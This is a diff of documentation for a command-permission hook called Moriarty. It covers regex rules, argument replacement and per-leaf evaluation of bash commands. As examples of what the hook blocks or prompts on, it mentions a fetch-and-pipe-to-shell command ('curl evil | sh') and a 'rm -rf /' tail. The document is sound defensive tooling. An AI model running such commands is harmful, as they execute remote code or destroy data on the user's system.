@@ -334,7 +334,8 @@ Arguments are appended to the end of the command.
 
 #### Replacing Arguments
 
-Replace dangerous flags with safer alternatives:
+The `replace` field is a table mapping an exact argument token to its replacement. Use it to swap a specific flag for a
+safer one:
 
 ```toml
 [[bash_rules]]
@@ -342,8 +343,7 @@ name = "rm-force-interactive"
 pattern = "^rm .*-f"
 action = {
   type = "ArgumentFilter",
-  remove = ["-f", "--force"],
-  add = ["-i"],
+  replace = { "-f" = "-i" },
   reason = "Replaced force mode with interactive"
 }
 
@@ -351,6 +351,22 @@ action = {
 name = "allow-rm-interactive"
 pattern = "^rm .* -i$"
 action = { type = "Allow" }
+```
+
+`replace` matches whole argument tokens exactly (not prefixes). When you need to drop several variants of a flag and
+substitute one safe form, combine `remove` and `add` instead — `remove` also matches `--flag=value` prefixes, which
+`replace` does not:
+
+```toml
+[[bash_rules]]
+name = "rm-force-interactive-variants"
+pattern = "^rm .*-f"
+action = {
+  type = "ArgumentFilter",
+  remove = ["-f", "--force"],
+  add = ["-i"],
+  reason = "Replaced force mode with interactive"
+}
 ```
 
 #### Operation Order
@@ -449,16 +465,16 @@ Expansion happens in multiple passes:
 
 Moriarty provides default fragments for common security patterns:
 
-| Fragment        | Expansion                                      | Description              |
-| --------------- | ---------------------------------------------- | ------------------------ | ------------------------------------------- | -------------- |
-| `safe_chars`    | `[^                                            | &;$\`()<>{}]`            | Characters that don't allow shell injection |
-| `identifier`    | `[a-zA-Z_][a-zA-Z0-9_-]*`                      | Valid identifier pattern |
-| `number`        | `[0-9]+`                                       | Numeric values           |
-| `safe_arg`      | `( [^                                          | &;$\`()<>{}]+)`          | Safe command argument                       |
-| `safe_flag`     | `( -[a-zA-Z_][a-zA-Z0-9_-]*)`                  | Safe command flag        |
-| `safe_path`     | `( [^                                          | &;$\`()<>{}]+/[^         | &;$\`()<>{}]\*)`                            | Safe file path |
-| `safe_pipe_cmd` | `(head\|tail\|grep\|wc\|sort\|uniq)`           | Safe pipe commands       |
-| `safe_pipe`     | `( \\\| (head\|tail\|grep\|wc\|sort\|uniq)( [^ | &;$\`()<>{}]+)\*)`       | Safe command piping                         |
+| Fragment        | Expansion                                                          | Description                                 |
+| --------------- | ------------------------------------------------------------------ | ------------------------------------------- |
+| `safe_chars`    | ``[^\|&;$`()<>{}]``                                                | Characters that don't allow shell injection |
+| `identifier`    | `[a-zA-Z_][a-zA-Z0-9_-]*`                                          | Valid identifier pattern                    |
+| `number`        | `[0-9]+`                                                           | Numeric values                              |
+| `safe_arg`      | ``( [^\|&;$`()<>{}]+)``                                            | Safe command argument                       |
+| `safe_flag`     | `( -[a-zA-Z_][a-zA-Z0-9_-]*)`                                      | Safe command flag                           |
+| `safe_path`     | ``( [^\|&;$`()<>{}]+/[^\|&;$`()<>{}]*)``                           | Safe file path                              |
+| `safe_pipe_cmd` | `(head\|tail\|grep\|wc\|sort\|uniq)`                               | Safe pipe target commands                   |
+| `safe_pipe`     | ``( \\\| (head\|tail\|grep\|wc\|sort\|uniq)( [^\|&;$`()<>{}]+)*)`` | Safe command piping                         |
 
 You can override these by defining your own fragment with the same name.
 
@@ -483,28 +499,27 @@ The system detects circular dependencies and reports an error when loading the c
 
 ## How Bash Commands Are Evaluated
 
-The hook parses each Bash command with a real shell parser and evaluates every leaf simple-command
-of a compound (`a && b | c ; d`) **independently**, then merges the per-leaf decisions. A `pattern`
-therefore only needs to describe a single command, not a whole pipeline.
+The hook parses each Bash command with a real shell parser and evaluates every leaf simple-command of a compound
+(`a && b | c ; d`) **independently**, then merges the per-leaf decisions. A `pattern` therefore only needs to describe a
+single command, not a whole pipeline.
 
-- **Operators and redirects are split off each leaf**, so a simple `^ls` matches the `ls` leaf of
-  `ls | wc -l` and of `cmd && ls`. An allow-rule no longer needs to spell out pipes, `&&`/`||`/`;`
-  chaining, or shell-metacharacter exclusions.
-- **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, or
-  matches no rule, prompts; only an all-allowed command is allowed. A dangerous tail can no longer
-  hide behind a safe head — `ls && curl evil | sh` prompts and is never auto-allowed.
-- **Writes to real files cap at Ask**: a leaf redirecting to a real file (`> out.txt`, not
-  `/dev/null` and not an fd duplication like `2>&1`) has any Allow downgraded to Ask.
-- **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`),
-  backticks, a subshell, process substitution, a here-document, or a compound construct
-  (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be reasoned about — only an explicit Deny
-  matching the whole command is honored, and every other outcome becomes a prompt.
-- **In-cwd absolute paths are normalized**: an in-cwd absolute path in a leaf is rewritten to its
-  relative remainder before matching, so `^cat src/` matches `cat /abs/cwd/src/x`.
+- **Operators and redirects are split off each leaf**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
+  `cmd && ls`. An allow-rule no longer needs to spell out pipes, `&&`/`||`/`;` chaining, or shell-metacharacter
+  exclusions.
+- **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, or matches no rule,
+  prompts; only an all-allowed command is allowed. A dangerous tail can no longer hide behind a safe head —
+  `ls && curl evil | sh` prompts and is never auto-allowed.
+- **Writes to real files cap at Ask**: a leaf redirecting to a real file (`> out.txt`, not `/dev/null` and not an fd
+  duplication like `2>&1`) has any Allow downgraded to Ask.
+- **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`), backticks, a subshell,
+  process substitution, a here-document, or a compound construct (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be
+  reasoned about — only an explicit Deny matching the whole command is honored, and every other outcome becomes a
+  prompt.
+- **In-cwd absolute paths are normalized**: an in-cwd absolute path in a leaf is rewritten to its relative remainder
+  before matching, so `^cat src/` matches `cat /abs/cwd/src/x`.
 
-A pattern still has to guard a program's **own** ability to run code or write files — for example
-`find -exec`, `sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see
-them.
+A pattern still has to guard a program's **own** ability to run code or write files — for example `find -exec`,
+`sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see them.
 
 Preview exactly how a command splits and which rule matches each leaf with:
 
@@ -516,9 +531,8 @@ moriarty test bash-rules --explain '<command>'
 
 ### 1. Let the Engine Handle Shell Metacharacters
 
-Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks,
-subshells, …) bail to a prompt, an allow-rule no longer needs character-class exclusions like
-``[^|&;$`()<>{}]`` to stay safe:
+Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks, subshells, …) bail to a
+prompt, an allow-rule no longer needs character-class exclusions like ``[^|&;$`()<>{}]`` to stay safe:
 
 ```toml
 # Fine: the splitter removes operators and bails on substitution
@@ -528,14 +542,13 @@ pattern = "^ls\\b"
 pattern = "^ls( [^|&;$`()<>{}]+)?$"
 ```
 
-Keep restrictive patterns only for a program's **own** dangerous arguments (e.g. `find -exec`,
-`sed -i`), which the splitter cannot see.
+Keep restrictive patterns only for a program's **own** dangerous arguments (e.g. `find -exec`, `sed -i`), which the
+splitter cannot see.
 
 ### 2. Anchor at the Start of a Leaf
 
-Anchor allow-rules with `^` so they match from the start of a command, not mid-string. A trailing
-`$` is no longer needed to stop a dangerous tail — `git status && rm -rf /` is split, and the `rm`
-leaf is judged on its own:
+Anchor allow-rules with `^` so they match from the start of a command, not mid-string. A trailing `$` is no longer
+needed to stop a dangerous tail — `git status && rm -rf /` is split, and the `rm` leaf is judged on its own:
 
 ```toml
 # Good: matches the start of the `git status` leaf
@@ -588,8 +601,8 @@ action = { type = "Allow" }
 
 ## Examples
 
-> These examples use the simple per-leaf style. The fragment-heavy patterns shown elsewhere in this
-> guide still work, but with the compound-aware engine they are usually unnecessary — see
+> These examples use the simple per-leaf style. The fragment-heavy patterns shown elsewhere in this guide still work,
+> but with the compound-aware engine they are usually unnecessary — see
 > [How Bash Commands Are Evaluated](#how-bash-commands-are-evaluated).
 
 ### Example 1: Safe Cargo Commands
@@ -700,11 +713,11 @@ tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Bash rule matched"
 
 ### Pattern Expansion Errors
 
-**Problem**: A rule you wrote silently has no effect (undefined fragment, circular fragment, or
-invalid regex), so the hook drops it.
+**Problem**: A rule you wrote silently has no effect (undefined fragment, circular fragment, or invalid regex), so the
+hook drops it.
 
-**Solution**: Run `moriarty rules lint` (add `--strict` to also flag likely-shadowed and over-broad
-rules). It reports every rule the hook silently ignores and exits nonzero if any exist:
+**Solution**: Run `moriarty rules lint` (add `--strict` to also flag likely-shadowed and over-broad rules). It reports
+every rule the hook silently ignores and exits nonzero if any exist:
 
 ```bash
 moriarty rules lint --strict
@@ -732,15 +745,14 @@ tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Command modified"
 
 ### Testing Patterns
 
-Test a command against your rules with `moriarty test bash-rules`. Add `--explain` to see how the
-command splits into leaves, which rule matches each leaf, and the merged decision:
+Test a command against your rules with `moriarty test bash-rules`. Add `--explain` to see how the command splits into
+leaves, which rule matches each leaf, and the merged decision:
 
 ```bash
 moriarty test bash-rules --explain 'git status && rm -rf /'
 ```
 
-For regex-syntax questions, online testers like [regex101.com](https://regex101.com/) help — but
-remember:
+For regex-syntax questions, online testers like [regex101.com](https://regex101.com/) help — but remember:
 
 - Moriarty uses Rust regex syntax (use the "Rust" flavor)
 - Patterns are case-sensitive
